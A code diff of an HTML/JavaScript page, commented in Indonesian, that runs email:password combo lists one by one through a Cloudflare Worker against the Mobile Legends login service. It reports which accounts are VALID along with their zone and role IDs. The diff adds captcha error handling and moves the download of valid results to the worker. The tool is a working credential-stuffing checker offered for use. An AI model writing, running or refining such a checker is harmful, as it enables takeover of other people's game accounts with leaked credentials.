@@ -24,7 +24,7 @@
 <br>
 <button id="startBtn">Start Checking</button>
 <button id="stopBtn" disabled>Stop</button>
-<button id="downloadBtn">Download valid_session.txt</button>
+<button id="downloadBtn">Download valid.txt</button>
 <div id="status" style="margin-top:10px;"></div>
 
 <div id="captcha-root"></div>
@@ -33,13 +33,12 @@
 
 <script>
 const CAPTCHA_ID = "fef5c67c39074e9d845f4bf579cc07af"; // Ganti dengan captchaId kamu
-const WORKER_URL = "https://mlbbinfo2.bonar7527.workers.dev"; // Ganti dengan URL Worker kamu
+const WORKER_URL = "https://c33769d4.mlbbchecker.pages.dev"; // Sesuaikan dengan Worker URL kamu
 
 let combos = [];
 let currentIndex = 0;
 let stopRequested = false;
 let neCaptchaInstance = null;
-const validAccounts = [];
 
 const logEl = document.getElementById("log");
 const statusEl = document.getElementById("status");
@@ -125,7 +124,13 @@ function showCaptchaOnce() {
 async function checkOneAccount(account) {
   appendLog(`Minta captcha untuk ${account.email}`, "info");
   statusEl.textContent = `Checking ${currentIndex+1}/${combos.length}: ${account.email}`;
-  const token = await showCaptchaOnce();
+  let token;
+  try {
+    token = await showCaptchaOnce();
+  } catch(e) {
+    appendLog(`Captcha gagal untuk ${account.email}: ${e}`, "bad");
+    return;
+  }
 
   appendLog(`Token captcha diterima`, "info");
   try {
@@ -147,8 +152,10 @@ async function checkOneAccount(account) {
     const data = await resp.json();
 
     if(data.code === 0 && data.data) {
-      appendLog(`VALID => ${account.email} | GUID: ${data.data.guid || "N/A"} | ZoneID: ${data.data.zoneId || "N/A"} | RoleID: ${data.data.roleId || "N/A"}`, "ok");
-      validAccounts.push(`${account.email}|${account.password}|ZoneID:${data.data.zoneId || "N/A"}|RoleID:${data.data.roleId || "N/A"}`);
+      // Ambil zoneId dan roleId dari response, sesuai worker kamu
+      const zoneId = data.data.zoneId || "N/A";
+      const roleId = data.data.roleId || "N/A";
+      appendLog(`VALID => ${account.email} | ZoneID: ${zoneId} | RoleID: ${roleId}`, "ok");
     } else if(data.code === 1004) {
       appendLog(`NOT FOUND => ${account.email}`, "bad");
     } else if(data.code === 1005) {
@@ -194,8 +201,6 @@ async function startProcess() {
 
     combos.splice(currentIndex, 1);
     updateTextareaCombos();
-
-    // Tidak increment currentIndex karena array sudah berkurang
   }
 
   appendLog("Selesai", "info");
@@ -211,17 +216,7 @@ stopBtn.addEventListener("click", () => {
 });
 
 downloadBtn.addEventListener("click", () => {
-  if(validAccounts.length === 0) {
-    alert("Belum ada akun valid yang dicek.");
-    return;
-  }
-  const blob = new Blob([validAccounts.join("\n")], {type: "text/plain"});
-  const url = URL.createObjectURL(blob);
-  const a = document.createElement("a");
-  a.href = url;
-  a.download = "valid_session.txt";
-  a.click();
-  URL.revokeObjectURL(url);
+  window.open(WORKER_URL + "/download", "_blank");
 });
 </script>
 
